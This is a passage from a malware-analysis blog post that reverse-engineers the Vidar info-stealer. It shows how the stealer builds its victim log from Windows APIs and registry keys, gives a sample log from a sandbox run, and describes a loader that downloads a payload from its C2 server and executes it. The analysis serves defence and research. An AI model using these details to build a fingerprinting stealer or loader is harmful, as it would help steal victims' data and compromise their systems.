<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="488" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_screenshot_03-2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?fit=541%2C563&amp;ssl=1" data-orig-size="541,563" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_screenshot_03" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?fit=288%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?fit=541%2C563&amp;ssl=1" class=" size-full wp-image-488 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?resize=541%2C563&#038;ssl=1" alt="vidar_screenshot_03" width="541" height="563" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?w=541&amp;ssl=1 541w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_03-1.png?resize=288%2C300&amp;ssl=1 288w" sizes="auto, (max-width: 541px) 100vw, 541px" /></p>
<p>So now its needed to collect the bits from the generated bitmap and copies them into a buffer that will generate the screen capture file.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="489" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_screenshot_04/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?fit=497%2C176&amp;ssl=1" data-orig-size="497,176" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_screenshot_04" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?fit=300%2C106&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?fit=497%2C176&amp;ssl=1" class=" size-full wp-image-489 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?resize=497%2C176&#038;ssl=1" alt="vidar_screenshot_04" width="497" height="176" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?w=497&amp;ssl=1 497w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_screenshot_04.png?resize=300%2C106&amp;ssl=1 300w" sizes="auto, (max-width: 497px) 100vw, 497px" /></p>
<h2>Information Log</h2>
<p>So let&#8217;s dig into information.txt, to understand how this file is generated. I will mention only some parts of the creation, another part will be just the corresponded API call, breakpoint on these API if you want to take your time to analyze all the step easily.</p>
<p>First, it indicates which version of Vidar is used.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="471" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_version/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?fit=842%2C395&amp;ssl=1" data-orig-size="842,395" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_version" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?fit=300%2C141&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?fit=842%2C395&amp;ssl=1" class="alignnone size-full wp-image-471" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?resize=842%2C395&#038;ssl=1" alt="vidar_version" width="842" height="395" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?w=842&amp;ssl=1 842w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?resize=300%2C141&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_version.png?resize=768%2C360&amp;ssl=1 768w" sizes="auto, (max-width: 842px) 100vw, 842px" /></p>
<p><span style="color: #ff0000;"><em>If you don&#8217;t see a Vidar on the log file. It means that you have an early version of it.</em></span></p>
<table style="height: 86px;" border="0" width="591" cellspacing="0">
<colgroup width="142"></colgroup>
<colgroup width="159"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Date</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemtimeasfiletime">GetSystemTimeAsFileTime</a></td>
</tr>
<tr>
<td align="left" height="17">MachineID</td>
<td align="left">Explained Above</td>
</tr>
<tr>
<td align="left" height="17">GUID</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcurrenthwprofilea">GetCurrentHwProfileA</a></td>
</tr>
<tr>
<td align="left" height="17">Path</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-getmodulefilenameexa">GetModuleFileNameExA</a></td>
</tr>
<tr>
<td align="left" height="17">Work Dir</td>
<td align="left">Hardcoded string + <strong><em><span style="color: #0000ff;">func_FolderNameGeneration</span></em></strong></td>
</tr>
</tbody>
</table>
<p>Get the name of the operating system and platform is classic because this is, in fact, a concatenation of two things. First, with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa">RegOpenKeyExA</a>, the value of this registry key is fetched:</p>
<pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName</pre>
<p>Secondly, for knowing if Windows is 32 or 64-bit, it checks itself if is running on <a href="https://docs.microsoft.com/fr-fr/windows/desktop/WinProg64/running-32-bit-applications">WOW64</a> with the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wow64apiset/nf-wow64apiset-iswow64process">IsWow64Process</a>.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="469" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_platform/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?fit=563%2C355&amp;ssl=1" data-orig-size="563,355" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_platform" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?fit=300%2C189&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?fit=563%2C355&amp;ssl=1" class=" size-full wp-image-469 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?resize=563%2C355&#038;ssl=1" alt="vidar_platform" width="563" height="355" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?w=563&amp;ssl=1 563w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_platform.png?resize=300%2C189&amp;ssl=1 300w" sizes="auto, (max-width: 563px) 100vw, 563px" /></p>
<table border="0" cellspacing="0">
<colgroup width="142"></colgroup>
<colgroup width="299"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Computer Name</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcomputernamea">GetComputerNameA</a></td>
</tr>
<tr>
<td align="left" height="17">User Name</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getusernamea">GetUserNameA</a></td>
</tr>
</tbody>
</table>
<p>For the current screen resolution used, <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wingdi/nf-wingdi-createdca">CreateDCA</a> is called to create a device context for &#8220;Display&#8221; and requesting the Width and Height of the Device with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/wingdi/nf-wingdi-getdevicecaps">GetDeviceCaps</a>.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="470" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_device/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?fit=449%2C345&amp;ssl=1" data-orig-size="449,345" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_device" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?fit=300%2C231&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?fit=449%2C345&amp;ssl=1" class=" size-full wp-image-470 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?resize=449%2C345&#038;ssl=1" alt="vidar_device" width="449" height="345" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?w=449&amp;ssl=1 449w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_device.png?resize=300%2C231&amp;ssl=1 300w" sizes="auto, (max-width: 449px) 100vw, 449px" /></p>
<p>This remains to this source code :</p>
<pre>HDC hDC = CreateDCA("DISPLAY", NULL, NULL, NULL);  
int width = GetDeviceCaps(hDC, HORZRES); // HORZRES = 0x8
int height = GetDeviceCaps(hDC, VERTRES); // VERTRES = 0x0A</pre>
<p>Let&#8217;s continue our in-depth analysis&#8230;</p>
<table border="0" cellspacing="0">
<colgroup width="142"></colgroup>
<colgroup width="299"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Display Language</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getuserdefaultlocalename">GetUserDefaultLocaleName</a></td>
</tr>
<tr>
<td align="left" height="17">Keyboard Languages</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeyboardlayoutlist">GetKeyboardLayoutList</a> / <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getlocaleinfoa">GetLocaleInfoA</a></td>
</tr>
<tr>
<td align="left" height="17">Local Time</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemtimeasfiletime">GetSystemTimeAsFileTime</a></td>
</tr>
<tr>
<td align="left" height="17">TimeZone</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/timezoneapi/nf-timezoneapi-tzspecificlocaltimetosystemtime">TzSpecificLocalTimeToSystemTime</a></td>
</tr>
</tbody>
</table>
<p><em><strong>Hardware</strong></em></p>
<p>??? the process name, the value of the registry key  is fetched:</p>
<pre>HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\ProcessorNameString</pre>
<table border="0" cellspacing="0">
<colgroup width="142"></colgroup>
<colgroup width="299"></colgroup>
<tbody>
<tr>
<td align="left" height="17">CPU Count</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/ns-sysinfoapi-_system_info">GetSystemInfo.dwNumberOfProcessors</a></td>
</tr>
<tr>
<td align="left" height="17">RAM</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex">GlobalMemoryStatusEx</a></td>
</tr>
<tr>
<td align="left" height="17">VideoCard</td>
<td align="left"><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumdisplaydevicesa">EnumDisplayDevicesW</a></td>
</tr>
</tbody>
</table>
<p><em><strong>Network</strong></em></p>
<p>The network part is quite easy, it&#8217;s a translation of data retrieves on <em><strong>ip-api.com/line/</strong> </em>and put into the log, at the corresponding place.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="468" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_network/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?fit=473%2C411&amp;ssl=1" data-orig-size="473,411" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Vidar_network" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?fit=300%2C261&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?fit=473%2C411&amp;ssl=1" class=" size-full wp-image-468 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?resize=473%2C411&#038;ssl=1" alt="Vidar_network" width="473" height="411" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?w=473&amp;ssl=1 473w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Vidar_network.png?resize=300%2C261&amp;ssl=1 300w" sizes="auto, (max-width: 473px) 100vw, 473px" /></p>
<p><em><strong>Processes</strong></em></p>
<p>There is quite soft stuff done to get a snapshot of all the processes at the time where the stealer is executed.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="477" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_process_snapshot/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?fit=502%2C740&amp;ssl=1" data-orig-size="502,740" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_process_snapshot" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?fit=204%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?fit=502%2C740&amp;ssl=1" class=" size-full wp-image-477 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?resize=502%2C740&#038;ssl=1" alt="vidar_process_snapshot" width="502" height="740" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?w=502&amp;ssl=1 502w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot.png?resize=204%2C300&amp;ssl=1 204w" sizes="auto, (max-width: 502px) 100vw, 502px" /></p>
<p>But in the end, this is not complicated at all to understand the different steps.</p>
<ul>
<li>Request <a href="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot</a>, to get the complete snapshot of all the processes executed, and read one per one in a loop all with <a href="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32first">Process32First</a></li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="481" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_process_snapshot_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?fit=957%2C556&amp;ssl=1" data-orig-size="957,556" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_process_snapshot_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?fit=300%2C174&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?fit=900%2C523&amp;ssl=1" class="alignnone size-full wp-image-481" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?resize=900%2C523&#038;ssl=1" alt="vidar_process_snapshot_01" width="900" height="523" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?w=957&amp;ssl=1 957w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?resize=300%2C174&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?resize=768%2C446&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_01.png?resize=740%2C430&amp;ssl=1 740w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>After, checking if it&#8217;s a parent process or a child process, Vidar will grab two value of the <em><strong><a href="https://docs.microsoft.com/fr-fr/windows/desktop/api/tlhelp32/ns-tlhelp32-tagprocessentry32">PROCESSENTRY32</a></strong></em> object :</p>
<ul>
<li>th32ProcessID: PID</li>
<li>szExeFile: The name of the PE</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="482" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_process_snapshot_02/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?fit=312%2C523&amp;ssl=1" data-orig-size="312,523" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_process_snapshot_02" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?fit=179%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?fit=312%2C523&amp;ssl=1" class=" size-full wp-image-482 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?resize=312%2C523&#038;ssl=1" alt="vidar_process_snapshot_02" width="312" height="523" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?w=312&amp;ssl=1 312w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_process_snapshot_02.png?resize=179%2C300&amp;ssl=1 179w" sizes="auto, (max-width: 312px) 100vw, 312px" /></p>
<p><em><strong>Software</strong></em></p>
<p>For the list of all installed software, the value of this registry key is fetched:</p>
<pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</pre>
<p>And these values are retrieves of each software.</p>
<ul>
<li>DisplayName</li>
<li>DisplayVersion</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="478" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_software_list/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?fit=681%2C826&amp;ssl=1" data-orig-size="681,826" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_software_list" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?fit=247%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?fit=681%2C826&amp;ssl=1" class="alignnone size-full wp-image-478" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?resize=681%2C826&#038;ssl=1" alt="vidar_software_list" width="681" height="826" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?w=681&amp;ssl=1 681w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_software_list.png?resize=247%2C300&amp;ssl=1 247w" sizes="auto, (max-width: 681px) 100vw, 681px" /></p>
<p><em><strong>Results</strong></em></p>
<p>So for example, if you want to see the results, let&#8217;s see into <a href="https://app.any.run/tasks/b439a1fd-fb62-4451-b9d4-d4a4597e3dfd">one sandbox analysis</a>, the generated information.txt (this is a Vidar 4.2 here)</p>
<pre>Vidar Version: 4.2

Date: Thu Dec 13 14:39:05 2018
MachineID: 90059c37-1320-41a4-b58d-2b75a9850d2f
GUID: {e29ac6c0-7037-11de-816d-806e6f6e6963}

Path: C:\Users\admin\AppData\Local\Temp\toto.exe 
Work Dir: C:\ProgramData\LDGQ3MM434V3HGAR2ZUK

Windows: Windows 7 Professional [x86]
Computer Name: USER-PC
User Name: admin
Display Resolution: 1280x720
Display Language: en-US
Keyboard Languages: English (United States)
Local Time: 13/12/2018 14:39:5
TimeZone: UTC-0

[Hardware]
Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz
CPU Count: 4
RAM: 3583 MB
VideoCard: Standard VGA Graphics Adapter

[Network]
IP: 185.230.125.140
Country: Switzerland (CH)
City: Zurich (Zurich)
ZIP: 8010
Coordinates: 47.3769,8.54169
ISP: M247 Ltd (M247 Ltd)

[Processes]
- System [4]
---------- smss.exe [264]
- csrss.exe [344]
&lt; ... &gt;

[Software]
Adobe Flash Player 26 ActiveX [26.0.0.131]
Adobe Flash Player 26 NPAPI [26.0.0.131]
Adobe Flash Player 26 PPAPI [26.0.0.131]
&lt; ... &gt;</pre>
<h2>Loader</h2>
<p>The task is rudimentary but enough to do the job :</p>
<ul>
<li>Generating a random name for the downloaded payload</li>
<li>Download the payload</li>
<li>Execute</li>
</ul>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="465" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_loader_01/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?fit=542%2C571&amp;ssl=1" data-orig-size="542,571" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_loader_01" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?fit=285%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?fit=542%2C571&amp;ssl=1" class=" size-full wp-image-465 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?resize=542%2C571&#038;ssl=1" alt="vidar_loader_01" width="542" height="571" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?w=542&amp;ssl=1 542w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_loader_01.png?resize=285%2C300&amp;ssl=1 285w" sizes="auto, (max-width: 542px) 100vw, 542px" /></p>
<p>When the binary file is downloaded from the C2, it&#8217;s using <a href="https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea">CreateFileA</a> with specific parameters :</p>
<ul>
<li><span style="color: #0000ff;"><em><strong>edi</strong></em></span> : <em>The downloaded data from the C2</em></li>
<li><span style="color: #339966;"><strong><em>80h</em></strong></span> : <em>&#8220;The file does not have other attributes set. This attribute is valid only if used alone.&#8221;</em></li>
<li><em><strong><span style="color: #339966;">2</span></strong></em> : <em>This option will force the overwriting if the filename already exists.</em></li>
<li><span style="color: #0000ff;"><em><strong>edi</strong></em></span> : ???</li>
<li><span style="color: #339966;"><em><strong>1</strong></em></span> : &#8220;<em>Enables subsequent open operations on a file or device to request read access.&#8221;</em>
<p class=""><em>Otherwise, other processes cannot open the file or device if they request read access.&#8221;</em></p>
</li>
<li><span style="color: #339966;"><strong><em>40000000h</em></strong></span> : <em>Write access (GENERIC_WRITE)</em></li>
<li><strong><em><span style="color: #0000ff;">ebp</span>+<span style="color: #339966;">lpFileName</span></em></strong> : <em>The generated filename </em></li>
</ul>
<p>When it&#8217;s done, it only needs to Write content into the files (WriteFile) and then close the corresponding handle (CloseHandle)</p>
